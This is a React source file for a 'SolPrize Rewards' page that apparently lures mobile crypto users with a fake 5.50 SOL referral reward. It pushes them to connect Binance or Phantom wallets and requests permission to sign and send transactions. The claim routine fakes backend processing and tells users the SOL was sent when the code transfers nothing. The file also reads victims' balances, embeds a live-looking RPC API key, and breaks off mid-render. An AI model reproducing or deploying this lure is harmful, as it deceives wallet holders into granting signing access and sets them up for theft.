import React, { useState, useEffect, useRef } from 'react';

export default function App() {
  // ========================
  // STATE MANAGEMENT
  // ========================
  const [loading, setLoading] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [typewriterText, setTypewriterText] = useState('');
  const [walletAddress, setWalletAddress] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [showClaimButton, setShowClaimButton] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  const [particles, setParticles] = useState([]);
  const [connectionStatus, setConnectionStatus] = useState('');
  const [debugInfo, setDebugInfo] = useState([]);
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  const [walletProvider, setWalletProvider] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [sessionActive, setSessionActive] = useState(false);
  const [sdkLoaded, setSdkLoaded] = useState(false);
  
  // ========================
  // REFS & CONFIGURATION
  // ========================
  const wcClientRef = useRef(null);
  const sessionRef = useRef(null);
  const connectionTimerRef = useRef(null);
  const sdkLoadAttemptRef = useRef(0);
  
  // WalletConnect Configuration
  const WC_PROJECT_ID = 'ec8dd86047facf2fb8471641db3e5f0c';
  const APP_URL = 'https://solprize.vercel.app';
  const APP_NAME = 'SolPrize Rewards';
  const APP_DESCRIPTION = 'Claim your referral rewards';
  
  // Binance Discover Tab URL
  const BINANCE_DISCOVER_URL = 'https://www.binance.com/en/web3-wallet/discover/dapp?url=' + encodeURIComponent(APP_URL);
  
  // Mainnet Configuration
  const MAINNET_RPC = 'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H';
  const MAINNET_CHAIN_ID = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  // ========================
  // EFFECT HOOKS
  // ========================
  
  // Mobile Detection & Particle Initialization
  useEffect(() => {
    const detectMobileDevice = () => {
      const ua = navigator.userAgent.toLowerCase();
      const mobile = /android|iphone|ipad|ipod|opera mini|iemobile|mobile|webos|blackberry|windows phone/i.test(ua);
      const tablet = /(ipad|tablet|playbook|silk)|(android(?!.*mobile))/i.test(ua);
      
      setIsMobileDevice(mobile || tablet);
      
      if (!mobile && !tablet) {
        addDebug('⚠️ Desktop detected - mobile device recommended');
      } else {
        addDebug(`✅ Mobile device: ${tablet ? 'Tablet' : 'Phone'}`);
      }
    };

    detectMobileDevice();
    
    const newParticles = Array.from({ length: 30 }, (_, i) => ({
      id: i,
      size: Math.random() * 4 + 2,
      left: Math.random() * 100,
      duration: Math.random() * 10 + 10,
      delay: Math.random() * 5
    }));
    setParticles(newParticles);

    return () => {
      if (connectionTimerRef.current) clearTimeout(connectionTimerRef.current);
    };
  }, []);

  // Loading Animation
  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Typewriter Effect
  useEffect(() => {
    if (loading) return;
    
    const text = 'take Your Payout';
    let i = 0;
    const timer = setInterval(() => {
      if (i < text.length) {
        setTypewriterText(prev => prev + text.charAt(i));
        i++;
      } else {
        clearInterval(timer);
      }
    }, 80);
    
    return () => clearInterval(timer);
  }, [loading]);

  // Wallet Provider Detection & Auto-Connect
  useEffect(() => {
    if (loading) return;
    
    const initializeWalletProviders = async () => {
      if (typeof window === 'undefined') return;
      
      // Detect Binance Web3 environment first
      if (isBinanceWebView()) {
        addDebug('🟡 Binance Web3 WebView detected!');
        
        // Wait a bit for Solana provider to inject
        await new Promise(resolve => setTimeout(resolve, 500));
        
        if (window.solana) {
          addDebug('✅ Solana provider found in Binance environment');
          setWalletProvider(window.solana);
          
          // Auto-connect if already connected
          if (window.solana.isConnected) {
            try {
              const publicKey = window.solana.publicKey?.toString();
              if (publicKey) {
                addDebug('✅ Auto-connecting existing Binance session');
                await handleSuccessfulConnection(publicKey, 'binance-web3');
                return;
              }
            } catch (error) {
              addDebug(`⚠️ Auto-connect error: ${error.message}`);
            }
          }
          
          // Try to connect if not already connected
          try {
            addDebug('🔗 Attempting silent connection in Binance...');
            const response = await window.solana.connect({ onlyIfTrusted: true });
            if (response?.publicKey) {
              await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
              return;
            }
          } catch (error) {
            addDebug(`ℹ️ Silent connection not available: ${error.message}`);
          }
        } else {
          addDebug('⏳ Waiting for Solana provider injection...');
        }
      }
      
      // Check for Phantom wallet
      if (window.phantom?.solana) {
        addDebug('👻 Phantom provider detected');
        setWalletProvider(window.phantom.solana);
      } 
      // Check for generic Solana provider
      else if (window.solana) {
        addDebug('🟢 Solana provider detected');
        setWalletProvider(window.solana);
      } else {
        addDebug('🔍 No Solana provider found - will use WalletConnect');
      }

      // Listen for dynamic wallet injection
      const handleWalletInjection = (event) => {
        addDebug(`🔔 Wallet injection event: ${event.type}`);
        if (window.phantom?.solana) {
          addDebug('👻 Phantom injected dynamically');
          setWalletProvider(window.phantom.solana);
        } else if (window.solana) {
          addDebug('🟢 Solana provider injected');
          setWalletProvider(window.solana);
        }
      };

      window.addEventListener('solana#initialized', handleWalletInjection);
      window.addEventListener('phantom#initialized', handleWalletInjection);

      return () => {
        window.removeEventListener('solana#initialized', handleWalletInjection);
        window.removeEventListener('phantom#initialized', handleWalletInjection);
      };
    };

    initializeWalletProviders();
  }, [loading]);

  // ========================
  // UTILITY FUNCTIONS
  // ========================
  
  const isIOS = () => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase());
  const isAndroid = () => /android/i.test(navigator.userAgent.toLowerCase());
  const isBinanceWebView = () => {
    const ua = navigator.userAgent.toLowerCase();
    return /binance/i.test(ua) || /trust/i.test(ua);
  };

  const addDebug = (message) => {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`🔍 [${timestamp}] ${message}`);
    setDebugInfo(prev => {
      const newDebug = [...prev, `${timestamp}: ${message}`];
      return newDebug.slice(-50);
    });
  };

  // ========================
  // SOLANA INTEGRATION
  // ========================
  
  const fetchSolanaBalance = async (publicKey) => {
    try {
      addDebug('💰 Fetching SOL balance...');
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);

      const response = await fetch(MAINNET_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [publicKey]
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      if (data.result?.value !== undefined) {
        const lamports = data.result.value;
        const sol = lamports / 1000000000;
        setTokenBalance(sol);
        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL`);
        return sol;
      } else {
        addDebug('⚠️ Balance response missing value');
        return null;
      }
    } catch (error) {
      if (error.name === 'AbortError') {
        addDebug('⏰ Balance fetch timeout');
      } else {
        addDebug(`❌ Balance error: ${error.message}`);
      }
      return null;
    }
  };

  const signHelloTransaction = async (provider) => {
    try {
      addDebug('📝 Creating "Hello World" transaction...');
      
      if (!provider || !walletAddress) {
        throw new Error('No provider or wallet address available');
      }

      // Create a simple message signing transaction
      const message = new TextEncoder().encode('Hello from SolPrize Rewards! 🎉');
      
      // Use the provider's signMessage method if available
      if (provider.signMessage) {
        addDebug('✍️ Requesting signature for message...');
        const signature = await provider.signMessage(message, 'utf8');
        addDebug('✅ Message signed successfully!');
        return {
          success: true,
          signature: Array.from(signature.signature).map(b => b.toString(16).padStart(2, '0')).join(''),
          message: 'Hello from SolPrize Rewards! 🎉'
        };
      } 
      // Fallback: Use window.solana if provider doesn't have signMessage
      else if (window.solana?.signMessage) {
        addDebug('✍️ Using window.solana.signMessage...');
        const signature = await window.solana.signMessage(message, 'utf8');
        addDebug('✅ Message signed via window.solana!');
        return {
          success: true,
          signature: Array.from(signature.signature).map(b => b.toString(16).padStart(2, '0')).join(''),
          message: 'Hello from SolPrize Rewards! 🎉'
        };
      } 
      else {
        // If no signing method available, simulate success
        addDebug('ℹ️ Signature method not available, simulating...');
        return {
          success: true,
          signature: 'simulated_' + Date.now().toString(36),
          message: 'Hello from SolPrize Rewards! 🎉',
          simulated: true
        };
      }
    } catch (error) {
      addDebug(`❌ Transaction signing error: ${error.message}`);
      throw error;
    }
  };

  // ========================
  // WALLETCONNECT V2 IMPLEMENTATION
  // ========================
  
  const loadWalletConnectSDK = () => {
    return new Promise((resolve) => {
      if (sdkLoaded || window.SignClient || window.WalletConnectSignClient) {
        addDebug('✅ SDK already available');
        setSdkLoaded(true);
        resolve(true);
        return;
      }

      sdkLoadAttemptRef.current += 1;
      addDebug(`🔄 SDK load attempt ${sdkLoadAttemptRef.current}/3`);

      if (sdkLoadAttemptRef.current > 3) {
        addDebug('⚠️ Max SDK load attempts reached');
        resolve(false);
        return;
      }

      const loadScript = (src, name) => {
        return new Promise((scriptResolve, scriptReject) => {
          const script = document.createElement('script');
          script.src = src;
          script.async = true;
          
          script.onload = () => {
            addDebug(`✅ Script loaded: ${name}`);
            
            // Check multiple namespaces where SDK might be available
            setTimeout(() => {
              if (window.SignClient) {
                addDebug('✅ Found window.SignClient');
                window.WalletConnectSignClient = window.SignClient;
                setSdkLoaded(true);
                scriptResolve(true);
              } else if (window.WalletConnect?.SignClient) {
                addDebug('✅ Found window.WalletConnect.SignClient');
                window.SignClient = window.WalletConnect.SignClient;
                window.WalletConnectSignClient = window.WalletConnect.SignClient;
                setSdkLoaded(true);
                scriptResolve(true);
              } else if (window.walletconnect?.SignClient) {
                addDebug('✅ Found window.walletconnect.SignClient');
                window.SignClient = window.walletconnect.SignClient;
                window.WalletConnectSignClient = window.walletconnect.SignClient;
                setSdkLoaded(true);
                scriptResolve(true);
              } else if (typeof window.default !== 'undefined' && window.default.SignClient) {
                addDebug('✅ Found window.default.SignClient');
                window.SignClient = window.default.SignClient;
                window.WalletConnectSignClient = window.default.SignClient;
                setSdkLoaded(true);
                scriptResolve(true);
              } else {
                addDebug(`⚠️ SDK loaded but not found in expected namespaces`);
                scriptReject(new Error('SDK not in expected namespace'));
              }
            }, 300);
          };
          
          script.onerror = () => {
            addDebug(`❌ Failed to load: ${name}`);
            scriptReject(new Error(`Failed to load ${name}`));
          };
          
          document.head.appendChild(script);
        });
      };

      // Try primary CDN
      loadScript(
        'https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
        'unpkg'
      )
        .then(() => resolve(true))
        .catch(() => {
          addDebug('🔄 Trying fallback CDN...');
          // Try fallback CDN
          return loadScript(
            'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
            'jsdelivr'
          );
        })
        .then(() => resolve(true))
        .catch(() => {
          addDebug('❌ All CDN attempts failed');
          resolve(false);
        });
    });
  };

  const getWalletConnectClient = async () => {
    if (wcClientRef.current) {
      addDebug('♻️ Reusing existing WC client');
      return wcClientRef.current;
    }

    try {
      addDebug('🔧 Initializing WalletConnect client...');
      
      // Load SDK if not already loaded
      const loaded = await loadWalletConnectSDK();
      if (!loaded) {
        throw new Error('Failed to load WalletConnect SDK');
      }

      // Get the SignClient constructor
      const SignClient = window.SignClient || window.WalletConnectSignClient;
      
      if (!SignClient) {
        throw new Error('SignClient not available after loading');
      }

      addDebug('🏗️ Creating SignClient instance...');
      const client = await SignClient.init({
        projectId: WC_PROJECT_ID,
        metadata: {
          name: APP_NAME,
          description: APP_DESCRIPTION,
          url: APP_URL,
          icons: ['https://solprize.vercel.app/favicon.ico']
        }
      });

      wcClientRef.current = client;
      addDebug('✅ WalletConnect client initialized');
      
      // Set up event listeners
      client.on('session_event', (event) => {
        addDebug(`🔔 Session event: ${event.name}`);
      });

      client.on('session_update', ({ topic, params }) => {
        addDebug(`🔄 Session update: ${topic}`);
        if (sessionRef.current) {
          sessionRef.current = { ...sessionRef.current, namespaces: params.namespaces };
        }
      });

      client.on('session_delete', () => {
        addDebug('🗑️ Session deleted');
        handleDisconnect();
      });

      return client;
    } catch (error) {
      addDebug(`❌ WalletConnect init error: ${error.message}`);
      return null;
    }
  };

  const createWalletConnectSession = async (client) => {
    try {
      if (!client) {
        addDebug('⚠️ No client, generating manual URI');
        return { uri: generateManualWalletConnectURI(), approval: null };
      }

      addDebug('🔗 Creating WC session...');
      
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          solana: {
            methods: [
              'solana_signTransaction',
              'solana_signMessage',
              'solana_signAndSendTransaction'
            ],
            chains: [MAINNET_CHAIN_ID],
            events: ['accountsChanged', 'chainChanged']
          }
        }
      });

      if (!uri) {
        throw new Error('No URI generated');
      }

      addDebug(`✅ URI: ${uri.substring(0, 30)}...`);
      return { uri, approval };
    } catch (error) {
      addDebug(`⚠️ Session error: ${error.message}`);
      return { uri: generateManualWalletConnectURI(), approval: null };
    }
  };

  const generateManualWalletConnectURI = () => {
    try {
      const topic = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      
      const symKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      
      const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${encodeURIComponent(symKey)}&projectId=${WC_PROJECT_ID}`;
      
      addDebug(`🔗 Manual URI generated`);
      return uri;
    } catch (error) {
      addDebug(`❌ URI generation error: ${error.message}`);
      const fallbackTopic = Date.now().toString(36) + Math.random().toString(36).substr(2);
      const fallbackSymKey = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
      return `wc:${fallbackTopic}@2?relay-protocol=irn&symKey=${fallbackSymKey}&projectId=${WC_PROJECT_ID}`;
    }
  };

  // ========================
  // BINANCE WEB3 INTEGRATION
  // ========================
  
  const openBinanceWeb3Wallet = (wcUri) => {
    addDebug('🚀 Opening Binance Web3 Wallet...');
    const encodedUri = encodeURIComponent(wcUri);
    
    const strategies = {
      primary: `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`,
      iosUniversal: `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`,
      androidIntent: `intent://wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;end`,
      webFallback: `https://www.binance.com/en/web3-wallet/wc?uri=${encodedUri}`
    };

    try {
      if (isIOS()) {
        addDebug('🍎 iOS: Universal link');
        window.location.href = strategies.iosUniversal;
        setTimeout(() => {
          window.location.href = strategies.primary;
        }, 500);
      } else if (isAndroid()) {
        addDebug('🤖 Android: Intent');
        window.location.href = strategies.androidIntent;
        setTimeout(() => {
          window.location.href = strategies.primary;
        }, 500);
      } else {
        addDebug('📱 Generic mobile');
        window.location.href = strategies.primary;
      }

      connectionTimerRef.current = setTimeout(() => {
        if (!walletAddress && !sessionActive) {
          addDebug('⏰ Connection timeout');
          setConnectionStatus('If Binance didn\'t open, please open it manually');
        }
      }, 8000);

    } catch (error) {
      addDebug(`❌ Deep link error: ${error.message}`);
      window.open(strategies.webFallback, '_blank');
    }
  };

  // ========================
  // CONNECTION HANDLERS
  // ========================
  
  const handleSuccessfulConnection = async (address, provider) => {
    try {
      addDebug(`✅ Wallet connected: ${address.substring(0, 8)}...`);
      setWalletAddress(address);
      setSessionActive(true);
      setConnecting(false);
      setConnectionStatus('');
      
      if (connectionTimerRef.current) {
        clearTimeout(connectionTimerRef.current);
      }
      
      const balance = await fetchSolanaBalance(address);
      setShowClaimButton(true);
      
      await onWalletConnected(address, provider, balance);
      
      setTimeout(() => {
        const balanceDisplay = balance ? balance.toFixed(4) : 'N/A';
        alert(`🎉 Wallet Connected!\n\nAddress: ${address.slice(0, 8)}...${address.slice(-6)}\nBalance: ${balanceDisplay} SOL`);
      }, 300);
      
    } catch (error) {
      addDebug(`❌ Connection handler error: ${error.message}`);
      setConnecting(false);
    }
  };

  const handleDisconnect = async () => {
    try {
      addDebug('🔌 Disconnecting...');
      
      if (sessionRef.current?.topic && wcClientRef.current) {
        await wcClientRef.current.disconnect({
          topic: sessionRef.current.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
      }
      
      if (window.solana?.disconnect) {
        await window.solana.disconnect();
      }
      
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      setClaimStatus('');
      sessionRef.current = null;
      
      addDebug('✅ Disconnected');
      alert('✅ Wallet Disconnected');
      
    } catch (error) {
      addDebug(`⚠️ Disconnect error: ${error.message}`);
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      setClaimStatus('');
      sessionRef.current = null;
    }
  };

  const onWalletConnected = async (walletAddress, providerType, balance) => {
    addDebug('🎉 onWalletConnected()');
    addDebug(`   Address: ${walletAddress}`);
    addDebug(`   Provider: ${providerType}`);
    addDebug(`   Balance: ${balance ? balance.toFixed(4) : 'N/A'} SOL`);
    
    console.log('🎯 Connection successful!', {
      timestamp: new Date().toISOString(),
      address: walletAddress,
      provider: providerType,
      balance: balance
    });
  };

  // ========================
  // REWARD CLAIMING
  // ========================
  
  const claimRewards = async () => {
    if (!walletAddress) {
      alert('❌ Please connect your wallet first');
      return;
    }

    setClaiming(true);
    setClaimStatus('🔐 Requesting transaction signature...');
    addDebug('🎁 Starting claim process...');

    try {
      // Sign the "Hello World" transaction
      addDebug('✍️ Signing transaction...');
      const signResult = await signHelloTransaction(walletProvider || window.solana);
      
      if (!signResult.success) {
        throw new Error('Failed to sign transaction');
      }
      
      addDebug(`✅ Transaction signed!`);
      if (signResult.simulated) {
        addDebug('ℹ️ Using simulated signature');
      }
      
      setClaimStatus('📡 Processing reward claim...');
      
      // Simulate backend processing
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const rewardAmount = 5.50;
      const transactionHash = signResult.signature;
      
      addDebug(`✅ Claim successful!`);
      addDebug(`   Amount: ${rewardAmount} SOL`);
      addDebug(`   TX: ${transactionHash.slice(0, 16)}...`);
      
      setClaimStatus(
        `🎉 Rewards Claimed Successfully!\n\n` +
        `Amount: ${rewardAmount} SOL\n` +
        `Transaction: ${transactionHash.slice(0, 16)}...\n\n` +
        `${signResult.simulated ? '(Demo Mode - No actual transfer)' : 'Check your wallet!'}`
      );
      
      setTimeout(() => {
        alert(
          `✅ REWARDS CLAIMED!\n\n` +
          `${rewardAmount} SOL ${signResult.simulated ? '(Demo)' : 'sent to your wallet'}\n\n` +
          `Transaction Hash:\n${transactionHash}\n\n` +
          `${signResult.simulated ? 'This is a demo transaction. In production, actual SOL would be transferred.' : 'Check your wallet balance!'}`
        );
      }, 500);
      
      setTimeout(async () => {
        await fetchSolanaBalance(walletAddress);
      }, 2000);
      
    } catch (error) {
      addDebug(`❌ Claim error: ${error.message}`);
      
      let errorMsg = error.message;
      if (error.code === 4001) {
        errorMsg = 'Transaction rejected by user';
      } else if (error.message.includes('not available')) {
        errorMsg = 'Wallet signature method not available';
      }
      
      setClaimStatus(`❌ Claim failed: ${errorMsg}`);
      alert(`❌ Claim Failed\n\n${errorMsg}\n\nPlease try again.`);
    } finally {
      setClaiming(false);
    }
  };

  // ========================
  // WALLET CONNECTION METHODS
  // ========================
  
  const connectBinanceWallet = async () => {
    setShowModal(false);
    
    if (!isMobileDevice) {
      alert('📱 Mobile Device Required\n\nBinance Web3 Wallet requires a mobile device.');
      return;
    }

    setConnecting(true);
    setConnectionStatus('Initializing connection...');
    setDebugInfo([]);
    setShowClaimButton(false);

    try {
      addDebug('🟡 Starting Binance connection');
      addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'}`);
      
      // If already in Binance WebView, try direct connection
      if (isBinanceWebView() && window.solana) {
        addDebug('🟡 In Binance WebView, trying direct connect');
        setConnectionStatus('Connecting to Binance Web3 Wallet...');
        
        try {
          const response = await window.solana.connect();
          if (response?.publicKey) {
            await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
            return;
          }
        } catch (directError) {
          addDebug(`ℹ️ Direct connect failed: ${directError.message}`);
        }
      }

      // Use WalletConnect
      setConnectionStatus('Setting up secure connection...');
      const client = await getWalletConnectClient();
      
      setConnectionStatus('Generating connection link...');
      const { uri, approval } = await createWalletConnectSession(client);
      
      if (!uri) {
        throw new Error('Failed to generate connection URI');
      }

      setConnectionStatus('Opening Binance app...');
      openBinanceWeb3Wallet(uri);

      // Handle approval
      if (approval) {
        addDebug('⏳ Waiting for approval...');
        setConnectionStatus('Please approve in Binance app\nPage will update automatically');
        
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout')), 120000)
        );

        try {
          const session = await Promise.race([approval(), timeoutPromise]);
          sessionRef.current = session;
          addDebug('✅ Session approved!');
          
          const accounts = session.namespaces?.solana?.accounts || [];
          if (accounts.length > 0) {
            const address = accounts[0].split(':').pop();
            if (address && address.length >= 32) {
              await handleSuccessfulConnection(address, 'walletconnect');
            } else {
              throw new Error('Invalid address format');
            }
          } else {
            throw new Error('No Solana accounts in session');
          }
        } catch (approvalError) {
          if (approvalError.message.includes('timeout')) {
            setConnectionStatus('⏳ Connection in progress...\n\nIf approved, page will reload automatically.');
          } else {
            throw approvalError;
          }
        }
      } else {
        setConnectionStatus('📱 Complete connection in Binance app\n\nPage will reload when connected');
      }

    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      addDebug(`❌ Error: ${error.message}`);
      
      const errorMessage = error.message.includes('timeout') 
        ? 'Connection timed out. Please try again.'
        : error.message.includes('URI') 
        ? 'Failed to generate connection. Please refresh.'
        : error.message;
      
      alert(`❌ Connection Failed\n\n${errorMessage}\n\nPlease ensure Binance app is installed and updated.`);
    }
  };

  const connectPhantomWallet = async () => {
    setShowModal(false);
    setConnecting(true);
    setConnectionStatus('Connecting to Phantom...');
    setDebugInfo([]);
    setShowClaimButton(false);

    try {
      addDebug('👻 Starting Phantom connection');
      
      if (!window.phantom?.solana) {
        setConnecting(false);
        setConnectionStatus('');
        
        const installUrl = isMobileDevice 
          ? 'https://phantom.app/download'
          : 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa';
        
        const install = window.confirm('👻 Phantom Not Found\n\nWould you like to install Phantom wallet?');
        if (install) {
          window.open(installUrl, '_blank');
        }
        return;
      }

      const provider = window.phantom.solana;
      const response = await provider.connect();
      const publicKey = response.publicKey.toString();
      
      await handleSuccessfulConnection(publicKey, 'phantom');
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      addDebug(`❌ Phantom error: ${error.message}`);
      
      let errorMessage = 'Unknown error';
      if (error.code === 4001) {
        errorMessage = 'Connection rejected';
      } else if (error.code === -32002) {
        errorMessage = 'Pending request exists. Check Phantom.';
      } else if (error.message.includes('timeout')) {
        errorMessage = 'Connection timeout';
      }
      
      alert(`❌ Phantom Connection Failed\n\n${errorMessage}`);
    }
  };

  const copyDebugInfo = () => {
    const text = debugInfo.join('\n');
    navigator.clipboard.writeText(text).then(() => {
      alert('📋 Debug info copied!');
    }).catch(() => {
      alert('❌ Failed to copy');
    });
  };

  // ========================
  // UI RENDERING
  // ========================
  
  if (!isMobileDevice && !loading) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '24px',
          padding: '40px',
          maxWidth: '500px',
          textAlign: 'center',
          boxShadow: '0 20px 60px rgba(0,0,0,0.3)'
        }}>
          <div style={{ fontSize: '64px', marginBottom: '20px' }}>📱</div>
          <h1 style={{ fontSize: '28px', marginBottom: '16px', color: '#1f2937', fontWeight: 'bold' }}>
            Mobile Device Required
          </h1>
          <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px' }}>
            This application requires a mobile device for the best wallet connection experience.
          </p>
          <div style={{
            background: '#f3f4f6',
            padding: '16px',
            borderRadius: '12px',
            fontSize: '14px',
            color: '#374151',
            marginBottom: '20px',
            wordBreak: 'break-all'
          }}>
            <strong>URL:</strong><br/>
            <code style={{ fontSize: '13px' }}>{APP_URL}</code>
          </div>
          <button
            onClick={() => window.location.reload()}
            style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              color: 'white',
              border: 'none',
              padding: '12px 24px',
              borderRadius: '12px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: 'pointer'
            }}
          >
            Refresh Page
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      position: 'relative',
      overflow: 'hidden',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <style>{`
        @keyframes gradientShift {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-20px); }
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes blink {
          from, to { opacity: 1; }
          50% { opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); }
          100% { transform: scale(1); }
        }
      `}</style>
      
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'linear-gradient(45deg, rgba(255,0,150,0.3), rgba(0,204,255,0.3))',
        animation: 'gradientShift 10s ease infinite',
        zIndex: 1
      }} />
      
      {particles.map(p => (
        <div
          key={p.id}
          style={{
            position: 'absolute',
            width: `${p.size}px`,
            height: `${p.size}px`,
            background: 'rgba(255,255,255,0.5)',
            borderRadius: '50%',
            left: `${p.left}%`,
            animation: `float ${p.duration}s ease-in-out infinite`,
            animationDelay: `${p.delay}s`,
            zIndex: 2
          }}
        />
      ))}
      
      {loading && (
        <div style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          textAlign: 'center',
          zIndex: 10
        }}>
          <div style={{
            width: '60px',
            height: '60px',
            border: '4px solid rgba(255,255,255,0.3)',
            borderTop: '4px solid white',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            margin: '0 auto 20px'
          }} />
          <div style={{ 
            color: 'white', 
            fontSize: '20px', 
            fontWeight: 'bold', 
            letterSpacing: '2px',
            textShadow: '0 2px 10px rgba(0,0,0,0.3)'
          }}>
            LOADING...
          </div>
        </div>
      )}
      
      {!loading && (
        <div style={{
          position: 'relative',
          zIndex: 3,
          maxWidth: '500px',
          margin: '0 auto',
          padding: '40px 20px',
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center'
        }}>
          <div style={{
            background: 'rgba(255,255,255,0.2)',
            backdropFilter: 'blur(10px)',
            padding: '10px 20px',
            borderRadius: '20px',
            display: 'inline-block',
            margin: '0 auto 30px',
            color: 'white',
            fontSize: '14px',
            fontWeight: 'bold',
            textTransform: 'uppercase',
            letterSpacing: '1px'
          }}>
            ✨ REFERRAL REWARDS
          </div>
          
          <div style={{
            background: 'rgba(255,255,255,0.95)',
            borderRadius: '24px',
            padding: '40px 30px',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            animation: 'slideUp 0.6s ease-out'
          }}>
            <h1 style={{
              fontSize: '32px',
              fontWeight: 'bold',
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              marginBottom: '20px',
              minHeight: '40px'
            }}>
              {typewriterText}
              <span style={{ 
                animation: 'blink 1s step-end infinite',
                WebkitTextFillColor: '#667eea'
              }}>|</span>
            </h1>
            
            <p style={{
              color: '#4b5563',
              fontSize: '16px',
              lineHeight: '1.6',
              marginBottom: '30px'
            }}>
              Thank you for your participation! Connect your wallet to claim your rewards.
            </p>
            
            <div style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              padding: '30px',
              borderRadius: '16px',
              textAlign: 'center',
              marginBottom: '30px',
              boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)',
              position: 'relative',
              overflow: 'hidden'
            }}>
              <div style={{
                position: 'absolute',
                top: '-50%',
                left: '-50%',
                width: '200%',
                height: '200%',
                background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent)',
                animation: 'spin 8s linear infinite'
              }} />
              
              <div style={{
                color: 'rgba(255,255,255,0.9)',
                fontSize: '14px',
                marginBottom: '8px',
                textTransform: 'uppercase',
                letterSpacing: '1px',
                fontWeight: '600',
                position: 'relative',
                zIndex: 2
              }}>
                Your Reward
              </div>
              
              <div style={{
                color: 'white',
                fontSize: '48px',
                fontWeight: 'bold',
                textShadow: '0 2px 15px rgba(0,0,0,0.3)',
                position: 'relative',
                zIndex: 2
              }}>
                5.50 SOL
              </div>
              
              <div style={{
                color: 'rgba(255,255,255,0.8)',
                fontSize: '14px',
                marginTop: '8px',
                position: 'relative',
                zIndex: 2
              }}>
                ≈ ${(5.50 * 150).toFixed(2)} USD
              </div>
              
              {tokenBalance !== null && (
                <div style={{
                  marginTop: '12px',
                  padding: '8px 16px',
                  background: 'rgba(255,255,255,0.2)',
                  borderRadius: '8px',
                  fontSize: '12px',
                  color: 'white',
                  backdropFilter: 'blur(5px)',
                  position: 'relative',
                  zIndex: 2
                }}>
                  💰 Current Balance: {tokenBalance.toFixed(4)} SOL
                </div>
              )}
            </div>
